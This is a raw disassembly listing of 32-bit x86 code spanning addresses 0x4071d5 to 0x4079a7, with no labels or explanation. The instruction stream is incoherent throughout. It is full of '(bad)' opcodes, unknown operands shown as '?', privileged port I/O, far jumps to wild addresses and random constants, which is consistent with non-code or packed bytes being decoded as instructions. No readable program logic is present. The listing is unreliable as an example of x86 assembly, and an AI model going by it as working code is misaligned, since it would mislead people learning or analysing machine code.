  4071d5:	or     eax,0x7f0cf9f9
  4071da:	das    
  4071db:	test   dl,dh
  4071dd:	mov    bh,al
  4071df:	scas   al,BYTE PTR es:[edi]
  4071e0:	pop    eax
  4071e1:	ds xchg ebx,eax
  4071e3:	cmp    BYTE PTR [ebx+eax*2+0x2d],cl
  4071e7:	fwait
  4071e8:	(bad)  
  4071e9:	xor    eax,ecx
  4071eb:	push   ss
  4071ec:	mov    ds:0xdb64389e,eax
  4071f1:	imul   ecx,DWORD PTR [edx+0x42ce48c0],0xf970c295
  4071fb:	dec    esp
  4071fc:	aad    0x0
  4071fe:	xchg   ebx,eax
  4071ff:	and    eax,0xb67baada
  407204:	and    al,0x61
  407206:	bound  eax,QWORD PTR [ebp-0x2295882c]
  40720c:	cs es mov eax,0x6b383b1b
  407213:	add    ch,BYTE PTR [ebx]
  407215:	mov    ebx,0xc947c4c0
  40721a:	jg     0x407287
  40721c:	jne    0x4071de
  40721e:	add    BYTE PTR [edx],dh
  407220:	out    dx,al
  407221:	lods   al,BYTE PTR ds:[esi]
  407222:	movups XMMWORD PTR [eax],xmm4
  407225:	mov    esi,0x7460d6cd
  40722a:	loop   0x4071d2
  40722c:	jmp    0x4072a8
  40722e:	add    eax,0xfffffff9
  407231:	pop    edi
  407233:	pop    es
  407234:	mov    ebx,DWORD PTR [edx+0xb46c854]
  40723a:	xchg   ecx,eax
  40723b:	mov    ebx,DWORD PTR [edi]
  40723d:	mov    ss,WORD PTR [eax-0x77]
  407240:	rol    DWORD PTR [esi],0x92
  407243:	je     0x4072b8
  407245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407246:	xchg   DWORD PTR [ecx+eiz*8+0x220e4539],edi
  40724d:	xlat   BYTE PTR ds:[ebx]
  40724e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40724f:	xchg   ecx,eax
  407250:	jmp    0x40724b
  407252:	cmp    eax,0x6a98c352
  407257:	loop   0x407272
  407259:	repz push ss
  40725b:	push   cs
  40725c:	(bad)  
  40725d:	push   esi
  40725e:	test   DWORD PTR [edi+0x2d],eax
  407261:	sbb    al,0xd
  407263:	lods   eax,DWORD PTR ds:[esi]
  407264:	dec    ecx
  407265:	mov    edx,0x5698b2c7
  40726a:	arpl   WORD PTR [eax],ax
  40726c:	ja     0x407216
  40726e:	inc    esp
  40726f:	add    DWORD PTR [edi+0x48],esp
  407272:	fs in  al,dx
  407274:	xor    eax,0x1c6fae58
  407279:	dec    esp
  40727a:	mov    DWORD PTR [edi],edx
  40727c:	bound  ecx,QWORD PTR [edi+0x28708033]
  407282:	addr16 out 0xb7,al
  407285:	dec    edx
  407286:	sub    al,0x7c
  407288:	sahf   
  407289:	arpl   sp,dx
  40728b:	(bad)  
  40728c:	or     ecx,DWORD PTR ds:0x7c970078
  407292:	int3   
  407293:	mov    gs,WORD PTR [esi]
  407295:	xchg   ebp,eax
  407296:	in     eax,dx
  407297:	mov    DWORD PTR [ecx+0x446f5ce9],edi
  40729d:	and    edi,DWORD PTR [esi+eiz*1-0x6dd0054]
  4072a4:	stos   DWORD PTR es:[edi],eax
  4072a5:	xor    ecx,eax
  4072a7:	lds    ecx,FWORD PTR [edx-0x20fe35be]
  4072ad:	mov    dl,0x41
  4072af:	mov    dh,0xea
  4072b1:	push   0x7a39b225
  4072b6:	in     eax,dx
  4072b7:	dec    eax
  4072b8:	mov    cl,BYTE PTR [ebx-0x5f]
  4072bb:	mov    es:0xb4fa0abb,al
  4072c1:	mov    dl,0x61
  4072c3:	mov    esp,DWORD PTR [eax-0x3c]
  4072c6:	out    0x47,eax
  4072c8:	(bad)  
  4072c9:	aaa    
  4072ca:	repnz outs dx,BYTE PTR ds:[esi]
  4072cc:	add    bl,al
  4072ce:	mov    WORD PTR [edx],cs
  4072d0:	add    eax,0x88b2fa03
  4072d5:	repz mov eax,ds:0x61c9d0cb
  4072db:	ficom  WORD PTR [edi-0x5e3c1f4a]
  4072e1:	mov    esp,0xa1e68ad2
  4072e6:	pop    edx
  4072e7:	mov    edi,0x9314ade4
  4072ec:	aam    0xc8
  4072ee:	and    dh,BYTE PTR [esi-0x10]
  4072f1:	xchg   ecx,eax
  4072f2:	xor    eax,0x69806729
  4072f7:	xchg   esi,eax
  4072f8:	xchg   esp,eax
  4072f9:	lods   al,BYTE PTR ds:[esi]
  4072fa:	jnp    0x40735d
  4072fc:	sub    esi,DWORD PTR [eax+0x2d]
  4072ff:	cmp    ecx,ebp
  407301:	enter  0x6b9,0xd1
  407305:	popf   
  407306:	aas    
  407307:	or     ebp,ebx
  407309:	icebp  
  40730a:	mov    eax,0xe25262ff
  40730f:	sub    dl,BYTE PTR [esp+ecx*8-0x3a7a16cf]
  407316:	xchg   ebx,eax
  407317:	pop    es
  407318:	dec    edi
  407319:	push   ss
  40731a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40731b:	push   cs
  40731c:	xor    eax,DWORD PTR [eax+0x47]
  40731f:	lds    edx,FWORD PTR [ecx+esi*2]
  407322:	rep stos BYTE PTR es:[di],al
  407325:	push   esi
  407326:	loopne 0x407393
  407328:	sub    eax,0xd10fd5cb
  40732d:	dec    edi
  40732e:	sub    eax,0xf52149b6
  407333:	mov    cl,0x41
  407335:	jne    0x40738f
  407337:	test   BYTE PTR [ecx+0x40],dl
  40733a:	cmp    al,0x7a
  40733c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40733e:	or     DWORD PTR [edx],edx
  407340:	cmc    
  407341:	fld    QWORD PTR [esi]
  407343:	xchg   ecx,eax
  407344:	retf   0xd861
  407347:	mov    esi,0x3ef10b16
  40734c:	xchg   BYTE PTR [ecx-0x4e055de8],dl
  407352:	sbb    BYTE PTR cs:[eax-0x6],cl
  407356:	xchg   ecx,eax
  407357:	shr    DWORD PTR [esi-0x7a30d210],0xf
  40735e:	pop    ebx
  40735f:	mov    al,0x69
  407361:	test   BYTE PTR [ecx],cl
  407363:	repz sub al,0x6b
  407366:	mov    al,ds:0x10548bee
  40736b:	into   
  40736c:	sbb    al,0x49
  40736e:	pop    es
  40736f:	ja     0x407309
  407371:	lock push 0x94dda541
  407377:	or     cl,BYTE PTR [edi]
  407379:	fcmovnu st,st(6)
  40737b:	pop    ds
  40737c:	jne    0x407340
  40737e:	in     eax,0x3
  407380:	mov    eax,ds:0x51b22525
  407385:	(bad)  
  407386:	not    BYTE PTR [ebp+ecx*2+0x12c33dac]
  40738d:	mov    DWORD PTR ds:0xe5931ffa,0x1c7acbb2
  407397:	lea    esp,[edi+0x67035a56]
  40739d:	mov    ebp,0x6dcad6e0
  4073a2:	in     al,dx
  4073a3:	sar    BYTE PTR [ebp+0xbbada1d],1
  4073a9:	sti    
  4073aa:	pop    edi
  4073ab:	ds push edi
  4073ad:	pop    ecx
  4073ae:	pop    esi
  4073af:	(bad)  [esi+0x6f]
  4073b2:	stc    
  4073b3:	sbb    BYTE PTR [edi-0x3f],ch
  4073b6:	sub    DWORD PTR [edx+0x67],eax
  4073b9:	mov    DWORD PTR [esp+esi*2-0x63642344],eax
  4073c0:	jcxz   0x407344
  4073c3:	es sub al,0xd6
  4073c6:	xor    ebx,DWORD PTR [edi]
  4073c8:	(bad)  
  4073c9:	arpl   cx,dx
  4073cb:	pop    ds
  4073cc:	inc    ebx
  4073cd:	dec    ebp
  4073ce:	xor    al,0xfd
  4073d0:	inc    esp
  4073d1:	mov    bl,0xd0
  4073d3:	or     ah,BYTE PTR [esi-0x36bc6564]
  4073d9:	jbe    0x407443
  4073db:	sar    dl,1
  4073dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073de:	and    eax,0xe583f168
  4073e3:	cwde   
  4073e4:	jl     0x407453
  4073e6:	loopne 0x407430
  4073e8:	jmp    0x5547073b
  4073ed:	test   BYTE PTR [ebp+0x1b],bh
  4073f0:	lods   eax,DWORD PTR ds:[esi]
  4073f1:	add    BYTE PTR [ebx],bl
  4073f3:	repz out 0xb8,eax
  4073f6:	cmp    BYTE PTR [edi+edi*8-0x24d4400d],ah
  4073fd:	data16 cli 
  4073ff:	(bad)  
  407400:	das    
  407401:	mov    ebx,0xb36b183a
  407406:	mov    esp,0xf6f089e4
  40740b:	arpl   cx,bx
  40740d:	es sub al,0xd
  407410:	mov    eax,0x2bcc8bfa
  407415:	ret    
  407416:	cmc    
  407417:	test   DWORD PTR [ebp+0x41a3a067],ebx
  40741d:	ds push edi
  40741f:	jl     0x40749a
  407421:	add    dh,dl
  407423:	and    eax,0x6b07b105
  407428:	and    ecx,DWORD PTR [esp+esi*4-0x70af7958]
  40742f:	out    0xb1,eax
  407431:	sub    ah,BYTE PTR [edi-0x2c]
  407434:	nop
  407435:	retf   0x12b4
  407438:	mov    al,0x24
  40743a:	push   0x6d6ad5a9
  40743f:	mov    cl,BYTE PTR [ecx]
  407441:	mov    bh,0xa9
  407443:	pop    esi
  407444:	pop    ebx
  407445:	test   ch,ch
  407447:	(bad)  [ebx-0x50]
  40744a:	mov    al,0x46
  40744c:	xchg   BYTE PTR [ebx-0x6bbe710e],bh
  407452:	cmc    
  407453:	pop    ebp
  407454:	cmp    edx,esp
  407456:	popf   
  407457:	addr16 jl 0x4074b1
  40745a:	cmp    BYTE PTR [esi+esi*1-0x6b0bfca8],al
  407461:	loop   0x4073fa
  407463:	mov    ?,WORD PTR [esi-0x264a6300]
  407469:	idiv   DWORD PTR [ebp-0x13]
  40746c:	cmp    eax,0x9b6c3c47
  407471:	mov    esp,0x8f102845
  407476:	cdq    
  407477:	scas   eax,DWORD PTR es:[edi]
  407478:	loopne 0x40742a
  40747a:	in     eax,dx
  40747b:	fidiv  WORD PTR [ecx+0x17]
  40747e:	cli    
  40747f:	div    BYTE PTR [edx+0x7c]
  407482:	call   0xbc2d910a
  407487:	lods   eax,DWORD PTR ds:[esi]
  407488:	xchg   edi,eax
  407489:	xchg   esi,eax
  40748a:	inc    edx
  40748b:	les    esp,FWORD PTR [ebp-0x5d]
  40748e:	mov    al,ds:0x19e782ba
  407493:	lods   eax,DWORD PTR ds:[esi]
  407494:	lods   eax,DWORD PTR ds:[esi]
  407495:	sbb    cl,BYTE PTR [edx]
  407497:	outs   dx,DWORD PTR ds:[esi]
  407498:	pop    edi
  407499:	jp     0x407440
  40749b:	retf   
  40749c:	loopne 0x4074df
  40749e:	test   al,0xf5
  4074a0:	stos   BYTE PTR es:[edi],al
  4074a1:	sti    
  4074a2:	mov    dh,0xfe
  4074a4:	xlat   BYTE PTR ds:[ebx]
  4074a5:	gs inc esi
  4074a7:	or     DWORD PTR [edi],0xffffff8d
  4074aa:	mov    edx,eax
  4074ac:	(bad)  
  4074ad:	jae    0x4074bc
  4074af:	pop    ds
  4074b0:	fistp  WORD PTR [edi-0x4cb19cf6]
  4074b6:	les    esi,FWORD PTR [edx-0x36]
  4074b9:	cdq    
  4074ba:	adc    DWORD PTR [ecx],edi
  4074bc:	pop    ebp
  4074bd:	mov    dl,0x5c
  4074bf:	jp     0x407502
  4074c1:	mov    bl,0x96
  4074c3:	mov    bl,0x81
  4074c5:	das    
  4074c6:	xor    DWORD PTR [ecx-0x691945ad],0x21ce571b
  4074d0:	xlat   BYTE PTR ds:[ebx]
  4074d1:	not    DWORD PTR [edx-0x78dcb3a4]
  4074d7:	mov    dh,0x6c
  4074d9:	xchg   esp,eax
  4074da:	addr16 push 0xffffffba
  4074dd:	lods   eax,DWORD PTR ds:[esi]
  4074de:	jns    0x4074a4
  4074e0:	mov    dh,bl
  4074e2:	mov    dl,0x7a
  4074e4:	sub    DWORD PTR [edx-0x80],ecx
  4074e7:	loop   0x4074ee
  4074e9:	lahf   
  4074ea:	test   BYTE PTR [edx],bh
  4074ec:	icebp  
  4074ed:	and    BYTE PTR [edi+0x166ae363],0x79
  4074f4:	call   ebp
  4074f6:	mov    esi,0x87f0115d
  4074fb:	mov    BYTE PTR [eax-0x540b8770],bh
  407501:	test   DWORD PTR [edx],edi
  407503:	fsubr  QWORD PTR [esi-0x7b]
  407506:	mov    ebp,0x12792d0b
  40750b:	scas   al,BYTE PTR es:[edi]
  40750c:	cld    
  40750d:	icebp  
  40750e:	in     al,0x3
  407510:	xlat   BYTE PTR ds:[ebx]
  407511:	stc    
  407512:	out    0x5f,eax
  407514:	cmp    esp,DWORD PTR [edx-0x256cafc1]
  40751a:	int3   
  40751b:	hlt    
  40751c:	cmp    eax,0xf40308bc
  407521:	add    eax,0x5f424f0b
  407526:	outs   dx,BYTE PTR ds:[esi]
  407527:	out    dx,eax
  407528:	fld    DWORD PTR [edx]
  40752a:	fdivp  st(5),st
  40752c:	or     DWORD PTR [ebx+0x23],0x26
  407530:	fdiv   QWORD PTR [edi+eiz*8+0xd]
  407534:	cmp    al,cl
  407536:	push   0x38322468
  40753b:	imul   DWORD PTR [edi+edi*4]
  40753e:	mov    es,WORD PTR [ecx+0x2f]
  407541:	loope  0x40752f
  407543:	mov    fs,eax
  407545:	imul   edx,DWORD PTR [edx],0xffffffa7
  407548:	loopne 0x407523
  40754a:	xchg   ecx,eax
  40754b:	cmp    dl,BYTE PTR [ecx-0x74523a64]
  407551:	dec    esp
  407552:	add    al,0xb4
  407554:	or     ecx,DWORD PTR [ebx+0x3c]
  407557:	popf   
  407558:	xchg   esp,eax
  407559:	xchg   BYTE PTR [bp+si+0xf],bl
  40755d:	dec    DWORD PTR [edi+ebx*2]
  407560:	cmp    al,0xab
  407562:	scas   eax,DWORD PTR es:[edi]
  407563:	and    cl,bh
  407565:	repnz dec ecx
  407567:	cmp    eax,0x3cd6aa0f
  40756c:	jns    0x40755d
  40756e:	dec    edi
  40756f:	lea    esi,[edi]
  407571:	cmp    DWORD PTR [esi],esi
  407573:	or     esi,ebx
  407575:	add    eax,0x521d279d
  40757a:	xchg   ebp,eax
  40757b:	arpl   WORD PTR [eax-0x21959761],bx
  407581:	ins    BYTE PTR es:[edi],dx
  407582:	pusha  
  407583:	jmp    0x4075fd
  407585:	sbb    bh,0xb9
  407588:	push   eax
  407589:	(bad)  
  40758a:	push   ecx
  40758b:	or     ah,BYTE PTR [esi]
  40758d:	lahf   
  40758e:	mov    dl,0x87
  407590:	inc    ebx
  407591:	gs jecxz 0x407536
  407594:	adc    ch,BYTE PTR [ebp-0x63]
  407597:	aaa    
  407598:	adc    ebp,ebx
  40759a:	push   edx
  40759b:	xlat   BYTE PTR ds:[ebx]
  40759c:	ror    edi,0xe8
  40759f:	test   al,0x3
  4075a1:	push   cs
  4075a2:	mov    eax,0xac75a8e9
  4075a7:	addr16 mov ecx,0xcfb4cdb1
  4075ad:	xchg   edx,eax
  4075ae:	bound  edx,QWORD PTR [ebx+ebp*2+0x2e]
  4075b2:	lahf   
  4075b3:	inc    ebp
  4075b4:	clc    
  4075b5:	inc    eax
  4075b6:	loopne 0x4075a9
  4075b8:	rcr    BYTE PTR [esi-0x66],cl
  4075bb:	or     cl,BYTE PTR [ecx+0x2a006b35]
  4075c1:	ror    BYTE PTR [eax],1
  4075c3:	adc    eax,0x58562ee3
  4075c8:	cmp    eax,0x20845a8a
  4075cd:	int    0xe9
  4075cf:	add    DWORD PTR [ebp-0x4cb7790a],ebp
  4075d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075d6:	cmp    BYTE PTR [ebx+ebx*1+0x4b860adc],dl
  4075dd:	clc    
  4075de:	lock mov edx,?
  4075e1:	pop    esi
  4075e2:	mov    DWORD PTR [ebp-0x216bee12],edi
  4075e8:	int    0x1
  4075ea:	push   ebp
  4075eb:	dec    edi
  4075ec:	sbb    al,0xb6
  4075ee:	shl    BYTE PTR [edx+0x65],cl
  4075f1:	test   dh,bl
  4075f3:	xchg   eax,ebp
  4075f5:	push   edx
  4075f6:	xchg   edx,eax
  4075f7:	ja     0x407633
  4075f9:	pop    ds
  4075fa:	sub    eax,0xb78c8a8e
  4075ff:	mov    dl,al
  407601:	aaa    
  407602:	sahf   
  407603:	lods   al,BYTE PTR ds:[esi]
  407604:	push   cs
  407605:	or     eax,0x429c6a26
  40760a:	cmp    BYTE PTR [edi+0x1b5e9cca],cl
  407610:	ss ror eax,1
  407613:	aas    
  407614:	mov    dl,0xb5
  407616:	lods   al,BYTE PTR ds:[esi]
  407617:	adc    esp,edi
  407619:	fst    DWORD PTR [ebp+eax*8+0x12]
  40761d:	les    ebx,FWORD PTR [eax]
  40761f:	mov    eax,0xfb5f5651
  407624:	jge    0x40767a
  407626:	xor    DWORD PTR ds:0xd1487bb3,0xffffffbc
  40762d:	sbb    edi,DWORD PTR [edi]
  40762f:	loopne 0x4075f7
  407631:	les    ecx,FWORD PTR [eax-0xc9a0d50]
  407637:	call   0xc90:0x2b7d7eb2
  40763e:	jo     0x4075e1
  407640:	inc    ebp
  407641:	adc    ch,ch
  407643:	inc    edi
  407644:	pop    eax
  407645:	aam    0x7c
  407647:	jmp    0x926596c7
  40764c:	cmc    
  40764d:	add    al,0xba
  40764f:	push   es
  407650:	aam    0x56
  407652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407653:	iret   
  407654:	inc    edi
  407655:	ds mov edi,0xc97e0897
  40765b:	jo     0x4076bf
  40765d:	and    eax,0x5af86dec
  407662:	inc    ebp
  407663:	jmp    0x4075e9
  407665:	add    eax,0xfc318239
  40766a:	sub    eax,0xb2075e44
  40766f:	test   al,0xd8
  407671:	aaa    
  407672:	xchg   ecx,eax
  407673:	jbe    0x407652
  407675:	hlt    
  407676:	clc    
  407677:	add    BYTE PTR [ecx-0x3f],0x3d
  40767b:	jmp    0x407663
  40767d:	aad    0xb8
  40767f:	sub    eax,0x399f5699
  407684:	cmp    eax,0x8d27f05c
  407689:	dec    edi
  40768a:	mov    ch,0x3d
  40768c:	xchg   ecx,eax
  40768d:	daa    
  40768e:	adc    dl,BYTE PTR [eax-0x45186b0d]
  407694:	into   
  407695:	in     al,0x9f
  407697:	js     0x40766f
  407699:	lea    esi,[esi]
  40769b:	jns    0x40762d
  40769d:	aaa    
  40769e:	or     ah,BYTE PTR [edi+0x6f57e28a]
  4076a4:	cld    
  4076a5:	jecxz  0x4076e1
  4076a7:	inc    edi
  4076a8:	dec    edi
  4076a9:	call   DWORD PTR [edi-0x7c]
  4076ac:	or     al,BYTE PTR [ebp+ebp*8+0x753e90d2]
  4076b3:	add    ebx,edx
  4076b5:	data16 mov WORD PTR [ebp+0x3566a01f],ds
  4076bc:	shl    dh,cl
  4076be:	or     DWORD PTR [edi+esi*1+0x4b],ebp
  4076c2:	xor    ebp,DWORD PTR [edi+eax*1+0x3f]
  4076c6:	pop    esp
  4076c7:	add    bl,ch
  4076c9:	fs inc esi
  4076cb:	rcl    DWORD PTR [esi],cl
  4076cd:	icebp  
  4076ce:	enter  0x10d5,0x60
  4076d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076d3:	xor    dh,BYTE PTR [edx]
  4076d5:	xchg   edx,eax
  4076d6:	and    ch,bh
  4076d8:	out    0x6c,al
  4076da:	push   ebp
  4076db:	mov    ds:0xc21ccac,al
  4076e0:	(bad)  
  4076e1:	cmp    ebx,DWORD PTR [esi+0x3f]
  4076e4:	or     eax,0x124d1f6b
  4076e9:	sbb    ch,BYTE PTR [eax-0x396fe5cb]
  4076ef:	xchg   BYTE PTR [edx+eiz*2+0x59f1dd37],dh
  4076f6:	lock and edx,edi
  4076f9:	mov    WORD PTR [ebp-0x6d],?
  4076fc:	mov    ebx,0x6c85fcf5
  407701:	pop    esi
  407702:	mov    WORD PTR [esi],?
  407704:	mov    ah,0x3b
  407706:	jl     0x4076ee
  407708:	sbb    bl,dl
  40770a:	repnz xor al,0x1
  40770d:	xchg   edx,eax
  40770e:	cmp    edi,DWORD PTR [eax+0x5698b053]
  407714:	pushf  
  407715:	jmp    0x6df8f2c4
  40771a:	sti    
  40771b:	or     eax,0xaffd13e6
  407720:	jbe    0x4076b6
  407722:	out    dx,al
  407723:	push   es
  407724:	outs   dx,BYTE PTR ds:[esi]
  407725:	into   
  407726:	jp     0x4076c7
  407728:	adc    al,0x7d
  40772a:	push   edi
  40772b:	in     eax,0x3c
  40772d:	mov    BYTE PTR [ebx],bh
  40772f:	jl     0x4076d3
  407731:	ds mov edi,0x8193bdc0
  407737:	push   ecx
  407738:	jmp    0x40775f
  40773a:	ficom  DWORD PTR ds:0x69a51c03
  407740:	enter  0xf9a1,0x91
  407744:	je     0x407780
  407746:	clc    
  407747:	stc    
  407748:	test   eax,0x536ff43c
  40774d:	arpl   sp,si
  40774f:	add    BYTE PTR [esi+0x6a],ah
  407752:	imul   edi,DWORD PTR [edx-0x27b62700],0x4166b132
  40775c:	out    dx,eax
  40775d:	and    esp,DWORD PTR [ecx+0x2c]
  407760:	test   al,0xba
  407762:	sbb    al,0xa5
  407764:	sbb    cl,BYTE PTR [edi-0x33163e35]
  40776a:	jl     0x40772f
  40776c:	adc    eax,0x161aaf95
  407771:	out    0xbd,al
  407773:	push   ebp
  407774:	fild   WORD PTR [eax]
  407776:	lds    edi,FWORD PTR [ebp-0x77]
  407779:	mov    bh,BYTE PTR [edx-0x45]
  40777c:	loop   0x40776f
  40777e:	xchg   ecx,eax
  40777f:	cwde   
  407780:	mov    edi,0x11dc65a6
  407785:	mov    ebx,eax
  407787:	mov    eax,0xe4b74b5a
  40778c:	mov    bh,0x16
  40778e:	jb     0x407750
  407790:	lods   al,BYTE PTR ds:[esi]
  407791:	pop    ebx
  407792:	cmp    eax,0x207feef7
  407797:	in     eax,0x1f
  407799:	gs pop esi
  40779b:	in     eax,dx
  40779c:	sub    eax,0x37507e7a
  4077a1:	fs cmovbe edi,esp
  4077a5:	inc    edx
  4077a6:	jmp    0x36ec:0x8db04cc4
  4077ad:	lods   al,BYTE PTR ds:[esi]
  4077ae:	dec    ebx
  4077af:	sti    
  4077b0:	(bad)  
  4077b1:	sbb    ecx,ebx
  4077b3:	xchg   esp,eax
  4077b4:	into   
  4077b5:	inc    ebp
  4077b6:	dec    ebx
  4077b7:	jns    0x4077e4
  4077b9:	mov    dh,0x3d
  4077bb:	scas   eax,DWORD PTR es:[edi]
  4077bc:	add    esi,DWORD PTR [esi]
  4077be:	stc    
  4077bf:	aaa    
  4077c0:	jnp    0x4077e7
  4077c2:	mov    ch,0x8d
  4077c4:	add    ch,BYTE PTR [edi*4+0x3343d19c]
  4077cb:	push   ebx
  4077cc:	fisubr DWORD PTR [edx-0x14]
  4077cf:	outs   dx,BYTE PTR ds:[esi]
  4077d0:	(bad)  
  4077d1:	mov    gs,WORD PTR [eax]
  4077d3:	add    al,ah
  4077d5:	mov    cl,0xd1
  4077d7:	outs   dx,DWORD PTR ds:[esi]
  4077d8:	pop    es
  4077d9:	out    dx,eax
  4077da:	fild   DWORD PTR [edx-0x7f]
  4077dd:	or     eax,0x58f10144
  4077e2:	pusha  
  4077e3:	pop    edx
  4077e4:	jmp    0x4077c4
  4077e6:	popf   
  4077e7:	cli    
  4077e8:	scas   al,BYTE PTR es:[edi]
  4077e9:	or     esp,esi
  4077eb:	cmc    
  4077ec:	inc    edx
  4077ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ee:	ret    0x23f4
  4077f1:	pusha  
  4077f2:	jnp    0x407799
  4077f4:	jo     0x4077e0
  4077f6:	repnz or eax,0x14412e24
  4077fc:	in     al,0x1c
  4077fe:	cmp    DWORD PTR fs:[ebx],edx
  407801:	jo     0x4077a0
  407803:	push   edx
  407804:	xlat   BYTE PTR ds:[ebx]
  407805:	outs   dx,BYTE PTR ds:[esi]
  407806:	inc    edx
  407807:	jnp    0x4077d2
  407809:	jle    0x40786b
  40780b:	mov    ebx,DWORD PTR [edx]
  40780d:	test   BYTE PTR ds:0x2f7332fc,bl
  407813:	std    
  407814:	inc    ebp
  407815:	sub    esi,DWORD PTR [eax+0x2a461725]
  40781b:	cmp    eax,0xe7bc41ff
  407820:	add    bh,BYTE PTR [eax+0x40]
  407823:	and    dh,BYTE PTR [esi]
  407825:	add    al,0x39
  407827:	push   ecx
  407828:	add    BYTE PTR [eax+0x64],ch
  40782b:	arpl   WORD PTR [ebp-0x71],di
  40782e:	push   edi
  40782f:	(bad)  
  407830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407831:	mov    dl,BYTE PTR [ebx]
  407833:	inc    edi
  407834:	rcr    BYTE PTR [edx+0x24b1bfe7],1
  40783a:	xor    BYTE PTR [esi+0x45f6bb1a],ch
  407840:	mov    edi,0xf60e4a9b
  407845:	outs   dx,BYTE PTR ds:[esi]
  407846:	mov    ebx,0xdc844ca1
  40784b:	retf   
  40784c:	cdq    
  40784d:	pop    eax
  40784e:	enter  0xb16c,0x7a
  407852:	addr16 mov ebp,0x809f6748
  407858:	in     eax,0x5d
  40785a:	ss pop ebx
  40785c:	jle    0x407888
  40785e:	mov    ch,0xc5
  407860:	and    eax,0x9efa5872
  407865:	mov    ch,0x72
  407867:	cwde   
  407868:	sbb    DWORD PTR [esi+0x5f856896],ebp
  40786e:	jle    0x40784f
  407870:	mov    ds:0xcfdc0432,eax
  407875:	fistp  WORD PTR [edx]
  407877:	dec    edi
  407878:	aaa    
  407879:	call   0xd87f9e5c
  40787e:	inc    esi
  40787f:	nop
  407880:	(bad)  
  407881:	cmc    
  407882:	pop    ecx
  407883:	popa   
  407884:	cmp    ebp,DWORD PTR ds:0x1d01776a
  40788a:	pop    eax
  40788b:	in     al,dx
  40788c:	push   edx
  40788d:	mov    edi,esp
  40788f:	cmp    edi,esi
  407891:	out    0x7b,al
  407893:	hlt    
  407894:	mul    DWORD PTR [ebp-0x798aadda]
  40789a:	xchg   esp,eax
  40789b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40789c:	mov    ds:0x12b6ddf6,al
  4078a1:	jbe    0x4078d0
  4078a3:	push   0xffffff8c
  4078a5:	xor    dh,BYTE PTR [ebx]
  4078a7:	push   0x45
  4078a9:	push   0xa40709d3
  4078ae:	mov    cl,cl
  4078b0:	inc    ah
  4078b2:	mov    BYTE PTR [edx+edi*2],ch
  4078b5:	cmc    
  4078b6:	dec    esi
  4078b7:	adc    ch,BYTE PTR [edx+0x3c5d5881]
  4078bd:	int3   
  4078be:	(bad)  
  4078c0:	sub    eax,0xbe1a7d67
  4078c5:	mov    ecx,0xed36ca36
  4078ca:	cmp    al,0x5f
  4078cc:	fdiv   DWORD PTR ds:[esi-0x3c425c07]
  4078d3:	dec    edx
  4078d4:	mov    ecx,0x34042be8
  4078d9:	pop    eax
  4078da:	push   es
  4078db:	retf   
  4078dc:	iret   
  4078dd:	xor    cl,BYTE PTR [ecx]
  4078df:	xchg   ebp,eax
  4078e0:	mov    dh,0x99
  4078e2:	les    ebx,FWORD PTR ds:0x1dedc776
  4078e8:	pop    ebx
  4078e9:	or     DWORD PTR [eax],esi
  4078eb:	sbb    esi,esi
  4078ed:	or     BYTE PTR [edx+eax*8-0x3],bh
  4078f1:	(bad)  
  4078f2:	leave  
  4078f3:	int    0x75
  4078f5:	add    al,BYTE PTR [esi]
  4078f7:	mov    ebp,0x97f92811
  4078fc:	mov    eax,ds:0x17645b61
  407901:	shl    DWORD PTR [ebp-0x4],1
  407904:	jno    0x407965
  407906:	cmc    
  407907:	xchg   edi,eax
  407908:	ja     0x4078b0
  40790a:	pop    ecx
  40790b:	pop    ds
  40790c:	pop    ebp
  40790d:	adc    al,0x93
  40790f:	add    DWORD PTR [edi-0x6b],ebx
  407912:	pop    ebx
  407913:	mov    ah,0x86
  407915:	push   ebx
  407916:	and    DWORD PTR [edi-0x495438c],esi
  40791c:	and    BYTE PTR [esi],ah
  40791e:	adc    DWORD PTR [edi-0x3e],esp
  407921:	in     al,0x34
  407923:	inc    esp
  407924:	mov    bh,0xf1
  407926:	sub    al,0xc9
  407928:	push   ebx
  407929:	mov    ds:0xffc1e431,al
  40792e:	push   0xa00a89a1
  407933:	dec    esp
  407934:	idiv   DWORD PTR [ebx+0x74]
  407937:	popa   
  407938:	dec    ebx
  407939:	mov    eax,DWORD PTR [edx]
  40793b:	mov    ds:0x5170a7f8,eax
  407940:	xchg   esi,eax
  407941:	shr    DWORD PTR [edx-0x4f2be0c3],0x0
  407948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407949:	sub    BYTE PTR [ebp+0x1e0bd3f6],bh
  40794f:	cld    
  407950:	in     eax,dx
  407951:	das    
  407952:	adc    eax,0x180d8a33
  407957:	test   al,0x9e
  407959:	lods   eax,DWORD PTR ds:[esi]
  40795a:	jbe    0x4079ce
  40795c:	and    al,0x7
  40795e:	pop    ecx
  40795f:	hlt    
  407960:	lods   eax,DWORD PTR ds:[esi]
  407961:	je     0x40794c
  407963:	loopne 0x407959
  407965:	cli    
  407966:	bound  ebp,QWORD PTR [ebx-0x69629766]
  40796c:	and    al,0x64
  40796e:	add    al,0x29
  407970:	xor    BYTE PTR [ebx-0x42],bh
  407973:	(bad)  
  407974:	mov    ds:0x5bbd56f1,al
  407979:	retf   
  40797a:	cmp    ebx,esi
  40797c:	sbb    dl,bl
  40797e:	in     al,0xc1
  407980:	lods   al,BYTE PTR ds:[esi]
  407981:	dec    edx
  407982:	add    al,0x9
  407984:	daa    
  407985:	ret    
  407986:	fs jge 0x4079fa
  407989:	dec    esi
  40798a:	inc    eax
  40798b:	add    DWORD PTR [ebp+0x1883e347],edx
  407991:	push   ds
  407992:	arpl   WORD PTR [ecx],di
  407994:	cmp    eax,0x19125236
  407999:	and    esp,edx
  40799b:	es jl  0x407a02
  40799e:	(bad)  
  40799f:	pushf  
  4079a0:	punpcklbw mm5,DWORD PTR [ecx-0x67]
  4079a4:	rol    ebp,cl
  4079a6:	aaa    
  4079a7:	cmp    al,0x3
